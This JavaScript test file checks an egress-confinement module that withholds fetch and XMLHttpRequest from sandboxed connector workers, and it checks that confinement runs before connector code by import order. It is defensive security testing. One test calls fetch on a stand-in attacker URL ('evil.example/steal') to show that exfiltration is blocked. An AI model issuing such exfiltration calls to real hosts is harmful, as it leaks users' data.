// Egress confinement — the SHARED core primitive (spec 012-01 AC5, relocated +
// EXTENDED to core/ by spec 016-01). Both chambers apply the same allow-list
// posture (withhold every ambient network primitive) but INVERT on `fetch`:
// alloy's `fetch` IS the mediated surface (fetch PRESERVED —
// `connectors/alloy/alloy-chamber.worker.js`, exhaustively regression-covered
// by test/alloy-egress-confinement.test.js, untouched by this slice); GA4's
// `fetch` is NOT mediated — its egress is the `ready` postMessage — so `fetch`
// is WITHHELD too (`opts.withholdFetch`).
//
// This file adds the withholdFetch mode (GA4) plus the import-ORDER guarantee
// that makes confinement bite before a compromised connector module's
// top-level code can run (016-01 AC2/AC7a) — see core/confine-ga4-chamber.js's
// header for the full ES-module post-order argument. A real-worker E2E of the
// full ordering (a genuine type:"module" Worker with a hostile connector) is
// deferred to a browser rig (no real worker here, to avoid the stale-worktree
// hang); the withholdFetch unit test below (which shows WHY order matters —
// reassignment doesn't retroactively fix an already-captured reference) and
// the source-order assertion (which shows confinement DOES run first for the
// real chamber) together establish the contract.
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { join, dirname } from "node:path";
import { applyEgressConfinement, CONFINEMENT_MESSAGE } from "../core/egress-confinement.js";

function makeFakeScope() {
  const realFetch = function fetch() { return Promise.resolve("real-response"); };
  return { scope: { fetch: realFetch, navigator: {} }, realFetch };
}

describe("applyEgressConfinement — default mode (alloy, unchanged spec-012-01 invariant)", () => {
  it("PRESERVES fetch — fetchPreserved:true, fetchWithheld:false", () => {
    const { scope, realFetch } = makeFakeScope();
    const record = applyEgressConfinement(scope);
    expect(scope.fetch).toBe(realFetch);
    expect(record.fetchPreserved).toBe(true);
    expect(record.fetchWithheld).toBe(false);
  });

  it("still withholds every other ambient network primitive by default", () => {
    const { scope } = makeFakeScope();
    scope.XMLHttpRequest = function XMLHttpRequest() { this.open = () => {}; };
    applyEgressConfinement(scope);
    expect(() => new scope.XMLHttpRequest()).toThrow(CONFINEMENT_MESSAGE);
  });
});

describe("applyEgressConfinement — withholdFetch mode (GA4, the INVERSE invariant, spec 016-01 AC2)", () => {
  it("replaces fetch with a throwing stub — calling it throws", () => {
    const { scope } = makeFakeScope();
    applyEgressConfinement(scope, { withholdFetch: true });
    expect(typeof scope.fetch).toBe("function");
    expect(() => scope.fetch("https://evil.example/steal")).toThrow(CONFINEMENT_MESSAGE);
  });

  it("reports the INVERTED success signal — fetchWithheld:true, fetchPreserved:false (never silently inherits alloy's true)", () => {
    const { scope } = makeFakeScope();
    const record = applyEgressConfinement(scope, { withholdFetch: true });
    expect(record.fetchWithheld).toBe(true);
    expect(record.fetchPreserved).toBe(false);
  });

  it("a reference captured BEFORE confinement runs still WORKS afterward — confinement only reassigns the property going forward (this is WHY import order is load-bearing, not stylistic)", () => {
    const { scope, realFetch } = makeFakeScope();
    const capturedBeforeConfinement = scope.fetch; // simulates a connector module's top-level `const f = self.fetch`
    applyEgressConfinement(scope, { withholdFetch: true });

    expect(capturedBeforeConfinement).toBe(realFetch);
    expect(() => capturedBeforeConfinement()).not.toThrow(); // the already-captured reference is untouched
    expect(() => scope.fetch()).toThrow(CONFINEMENT_MESSAGE); // but the live property now throws
  });

  it("still withholds every other ambient network primitive too (withholdFetch is additive, not a replacement mode)", () => {
    const { scope } = makeFakeScope();
    scope.XMLHttpRequest = function XMLHttpRequest() { this.open = () => {}; };
    applyEgressConfinement(scope, { withholdFetch: true });
    expect(() => new scope.XMLHttpRequest()).toThrow(CONFINEMENT_MESSAGE);
  });

  it("is idempotent in withholdFetch mode too", () => {
    const { scope } = makeFakeScope();
    applyEgressConfinement(scope, { withholdFetch: true });
    expect(() => applyEgressConfinement(scope, { withholdFetch: true })).not.toThrow();
    expect(() => scope.fetch()).toThrow(CONFINEMENT_MESSAGE);
  });
});

describe("import ORDER guarantee (spec 016-01 AC2/AC7a — the load-bearing ordering fix)", () => {
  const CHAMBER = join(dirname(fileURLToPath(import.meta.url)), "..", "core", "chamber.worker.js");

  it("core/chamber.worker.js's FIRST import statement names ./confine-ga4-chamber.js", () => {
    const src = readFileSync(CHAMBER, "utf8");
    const firstImportLine = src.match(/^import\s.+$/m);
    expect(firstImportLine).not.toBeNull();
    // By ES-module post-order evaluation, imports are evaluated in SOURCE
    // ORDER — so this being the FIRST import line pins the guarantee that
    // confinement's top-level runs before the connector-module imports below
    // it evaluate (a compromised connector's top-level self.fetch-capture
    // then already sees the withheld stub, not the live fetch).
    expect(firstImportLine[0]).toMatch(/["']\.\/confine-ga4-chamber\.js["']/);
  });

  it("core/confine-ga4-chamber.js applies withholdFetch confinement at its own top level", () => {
    const src = readFileSync(
      join(dirname(fileURLToPath(import.meta.url)), "..", "core", "confine-ga4-chamber.js"),
      "utf8",
    );
    expect(src).toMatch(/applyEgressConfinement\(self,\s*\{\s*withholdFetch:\s*true\s*\}\)/);
  });
});
